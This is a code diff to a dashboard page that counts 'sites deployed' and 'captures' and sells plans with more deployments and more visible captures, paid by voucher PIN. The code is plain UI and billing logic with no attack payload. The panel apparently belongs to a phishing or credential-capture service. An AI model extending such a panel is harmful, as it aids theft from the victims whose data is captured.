@@ -171,6 +171,10 @@
 
         <div class="stats-grid">
             <div class="stat-card">
+                <span class="stat-value" id="stat-sites">0</span>
+                <span class="stat-label">Sites Deployed</span>
+            </div>
+            <div class="stat-card">
                 <span class="stat-value" id="stat-count">0</span>
                 <span class="stat-label">Total Captures</span>
             </div>
@@ -179,8 +183,8 @@
                 <span class="stat-label">Hidden (Upgrade to View)</span>
             </div>
             <div class="stat-card">
-                <span class="stat-value" id="stat-status">Active</span>
-                <span class="stat-label">Account Status</span>
+                <span class="stat-value" id="stat-due">N/A</span>
+                <span class="stat-label">Next Payment Due</span>
             </div>
         </div>
 
@@ -212,7 +216,34 @@
         <!-- Upgrade Section -->
         <div class="payment-modal">
             <h3 style="margin-top:0;">💎 Upgrade Plan</h3>
-            <p style="color:var(--text-sec); font-size: 0.9rem;">Get more captures, remove ads, and unlock premium themes.</p>
+            <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap:20px; margin-bottom:20px;">
+                <div style="padding:15px; background:rgba(0,0,0,0.2); border-radius:8px; border:1px solid var(--border);">
+                    <strong style="color:var(--accent);">Free Plan</strong>
+                    <ul style="font-size:0.85rem; padding-left:20px; color:var(--text-sec);">
+                        <li>1 Deployment Max</li>
+                        <li>5 Visible Captures (Latest)</li>
+                        <li>Includes Ads</li>
+                    </ul>
+                </div>
+                <div style="padding:15px; background:rgba(0,0,0,0.2); border-radius:8px; border:1px solid var(--border);">
+                    <strong style="color:#2f81f7;">Basic Plan (10R)</strong>
+                    <ul style="font-size:0.85rem; padding-left:20px; color:var(--text-sec);">
+                        <li>3 Deployments Max</li>
+                        <li>15 Visible Captures (Latest)</li>
+                        <li>No Ads</li>
+                    </ul>
+                </div>
+                <div style="padding:15px; background:rgba(0,0,0,0.2); border-radius:8px; border:1px solid var(--border);">
+                    <strong style="color:#d4af37;">Premium Plan (20R)</strong>
+                    <ul style="font-size:0.85rem; padding-left:20px; color:var(--text-sec);">
+                        <li>15 Deployments Max</li>
+                        <li>Unlimited Captures</li>
+                        <li>No Ads, Priority Support</li>
+                    </ul>
+                </div>
+            </div>
+
+            <p style="color:var(--text-sec); font-size: 0.9rem;">Select a plan and enter your voucher code. Advance payments stack your expiry date.</p>
 
             <div class="payment-inputs">
                 <select id="voucher-type">
@@ -222,10 +253,10 @@
                 </select>
                 <input type="text" id="voucher-code" placeholder="Enter Voucher PIN">
                 <select id="target-plan">
-                    <option value="basic">Basic (10R)</option>
-                    <option value="premium">Premium (20R)</option>
+                    <option value="basic">Basic (10R / 30 Days)</option>
+                    <option value="premium" selected>Premium (20R / 30 Days)</option>
                 </select>
-                <button onclick="submitPayment()" class="btn-pay" id="btn-pay">Upgrade</button>
+                <button onclick="submitPayment()" class="btn-pay" id="btn-pay">Pay / Extend</button>
             </div>
             <p id="pay-msg" style="font-size: 0.8rem; margin-top: 10px; color: var(--text-sec);"></p>
         </div>
@@ -285,9 +316,32 @@
             const badge = document.getElementById('plan-badge');
             badge.innerText = plan.toUpperCase();
 
+            // Limits
+            let siteLimit = 1;
+            if (plan === 'basic') siteLimit = 3;
+            if (plan === 'premium') siteLimit = 15;
+
+            document.getElementById('stat-sites').innerText = `${data.siteCount || 0} / ${siteLimit}`;
             document.getElementById('stat-count').innerText = data.total || 0;
             document.getElementById('stat-hidden').innerText = data.hidden || 0;
-            document.getElementById('stat-status').innerText = 'Active'; // Default if success
+
+            // Payment Due
+            if (data.expiry) {
+                const due = new Date(data.expiry);
+                const now = Date.now();
+                const days = Math.ceil((due - now) / (1000 * 60 * 60 * 24));
+                const el = document.getElementById('stat-due');
+
+                if (days > 0) {
+                    el.innerText = `${days} Days`;
+                    el.style.color = days < 5 ? "var(--warning)" : "var(--success)";
+                } else {
+                     el.innerText = "Expired";
+                     el.style.color = "var(--danger)";
+                }
+            } else {
+                document.getElementById('stat-due').innerText = "Free Plan";
+            }
 
             if (plan === 'premium') {
                 document.getElementById('premium-actions').style.display = 'block';
@@ -297,8 +351,13 @@
         function handleLocked(status) {
             document.getElementById('locked-msg').style.display = 'block';
             document.getElementById('plan-badge').innerText = "LOCKED";
-            document.getElementById('stat-status').innerText = status.toUpperCase();
-            document.getElementById('stat-status').style.color = "var(--danger)";
+
+            const statDue = document.getElementById('stat-due');
+            if(statDue) {
+                statDue.innerText = status.toUpperCase();
+                statDue.style.color = "var(--danger)";
+                statDue.nextElementSibling.innerText = "Account Status";
+            }
 
             // Disable deploy
             const deployBtn = document.querySelector('.btn-deploy');
